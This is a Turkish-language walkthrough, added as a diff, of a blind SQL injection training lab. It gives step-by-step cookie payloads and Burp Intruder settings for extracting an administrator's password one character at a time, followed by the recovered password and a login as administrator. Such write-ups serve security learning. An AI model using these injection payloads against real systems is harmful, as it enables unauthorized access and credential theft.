@@ -1,0 +1,35 @@
+LAB: Blind SQL injection with conditional responses
+
+1 - Burp Suite ile istek yakalayın. TrackingId değişkenini aşağıdaki ile değiştirin. Hata vermeyecektir.
+TrackingId=xyz' AND '1'='1
+
+2 - TrackingId değişkenini aşağıdaki ile değiştirin. Hata verecektir. Buranın sömürülebileceğini anlıyoruz.
+TrackingId=xyz' AND '1'='2
+
+3 - Herhangi bir kullanıcı ile giriş yapabildiğimizi anlıyoruz.
+TrackingId=xyz' AND (SELECT 'a' FROM users LIMIT 1)='a
+
+4 - Administrator kullanıcısı ile giriş yapabildiğimizi anlıyoruz.
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator')='a
+
+5 - Administrator kullanıcısının parolasının uzunluğunu bulmaya çalışıyoruz.
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>2)='a
+
+6 - Burp Intruder -> Sniper -> Numbers -> 1, 30, 1 ilk hata verilen yer parola uzunluğunu belirtir.
+TrackingId=xyz' AND (SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>§2§)='a;
+
+7 - Parolasının uzunluğunu bulduktan sonra brute force yaparak parolayı bulmaya calisacagiz.
+TrackingId=xyz' AND (SELECT SUBSTRING(password,§2§,1) FROM users WHERE username='administrator')='§a§'--';
+
+Burp Suite -> Intruder -> Cluster Bomb
+1 - Numbers - 1, 20, 1 burada 20 karakterden oluştuğunu bulduğumuz parolanın her bir indexini temsil ediyor.
+2 - Brute Forcer - 1,1 burada her bir karakterin alabileceği değerleri temsil ediyor.
+
+Saldırı bitince 'welcome' stringi ile filtereleyerek aşağıdaki tabloyu doldurun.
+Payload 1 -> index
+Payload 2 -> değer
+
+1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20
+a 2 d f k 4 5 7 k 9   c  d  k  x  3  4  5  6  a  b
+
+8 - administrator kullanıcı ile giriş yapınca oda çözülüyor.
